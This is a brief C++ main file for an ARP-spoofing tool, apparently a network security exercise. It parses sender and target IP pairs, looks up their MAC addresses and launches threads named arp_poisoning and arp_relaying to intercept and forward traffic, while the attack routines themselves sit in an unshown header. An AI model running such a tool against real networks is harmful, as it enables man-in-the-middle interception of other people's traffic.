#include "sendarp_header.h"

using namespace std;

int main(int argc, char* argv[]){

    if (argc < 4 || argc % 2 != 0) {
        usage();
        return -1;
    }

    /* Make Sessions */
    vector<Session*> Sessions;
    Session *temp;
    for(int i = 1; i < argc/2; i++){
        temp = new Session;
        in_addr maskAddr;
        inet_aton(argv[2*i], &maskAddr);
        memcpy(temp->sender_ip, &maskAddr, 4);
        inet_aton(argv[2*i+1], &maskAddr);
        memcpy(temp->target_ip, &maskAddr, 4);
        Sessions.push_back(temp);
    }

    interface = argv[1];
    get_my_mac_ip();

    /* get sender_mac, target_mac for each sessions */
    for(auto a : Sessions){
        get_mac(a, 1);
        get_mac(a, 2);
    }

    thread thread1(&arp_poisoning, Sessions);
    thread thread2(&arp_relaying, Sessions);

    thread1.join();
    thread2.join();
}


